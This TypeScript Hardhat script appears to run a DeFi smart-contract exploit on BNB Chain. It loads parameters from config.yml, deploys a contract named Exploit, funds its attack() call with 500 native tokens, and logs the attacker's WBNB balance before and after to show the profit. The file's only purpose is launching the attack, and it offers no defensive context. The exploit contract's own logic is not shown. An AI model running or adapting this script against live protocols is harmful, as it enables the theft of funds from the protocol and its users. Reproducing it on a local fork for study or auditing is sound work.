// Import needed interface factories
// Theses interface factories will be generated automatically according to the exploit.sol and interfaces file 
import {Exploit__factory, IERC20__factory} from "../typechain";
import hre, { ethers } from "hardhat"
import YAML from 'yaml'
import fs from 'fs'

function eToNumber(num) {
  let sign = "";
  (num += "").charAt(0) == "-" && (num = num.substring(1), sign = "-");
  let arr = num.split(/[e]/ig);
  if (arr.length < 2) return sign + num;
  let dot = (.1).toLocaleString().substr(1, 1), n = arr[0], exp = +arr[1],
      w = (n = n.replace(/^0+/, '')).replace(dot, ''),
    pos = n.split(dot)[1] ? n.indexOf(dot) + exp : w.length + exp,
    L   = pos - w.length, s = "" + BigInt(w);
    w   = exp >= 0 ? (L >= 0 ? s + "0".repeat(L) : r()) : (pos <= 0 ? "0" + dot + "0".repeat(Math.abs(pos)) + s : r());
  L= w.split(dot); if (L[0]==0 && L[1]==0 || (+w==0 && +s==0) ) w = 0; //** added 9/10/2021
  return sign + w;
  function r() {return w.replace(new RegExp(`^(.{${pos}})(.)`), `$1${dot}$2`)}
}

async function main() {
  // Read parameters from config.yml
  const config_file = fs.readFileSync('config.yml', 'utf8');
  const config = YAML.parse(config_file);

  // Setup account
  const [signer] = await hre.ethers.getSigners();

  // Convert options to BigNumber
  let key: keyof typeof config['options'];
  for (key in config['options']) {
    config['options'][key] = eToNumber(config['options'][key]);
  }
  
  let input = {
    options: config['options'],
    addresses: config['address']
  }

  // Deploy exploit contract with intialized parameters from config.yml
  const exploit = await new Exploit__factory(signer).deploy(input);
  console.log("Exploit contract deployed to: ",exploit.address);
  
  // Show balance
  const WBNB = IERC20__factory.connect(config['address']['wbnb'],signer);
  console.log("Attacker WBNB balance:", hre.ethers.utils.formatUnits(await WBNB.balanceOf(signer.address),await WBNB.decimals()))
  
  // Execute exploit contract
  const exploitTx = await exploit.attack({value: ethers.utils.parseEther("500")});
  console.log("Exploiting... transcation: ",exploitTx.hash)
  await exploitTx.wait()

  // Display result
  console.log("Exploit complete.")
  console.log("Attacker WBNB balance:",hre.ethers.utils.formatUnits(await WBNB.balanceOf(signer.address),await WBNB.decimals()))
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
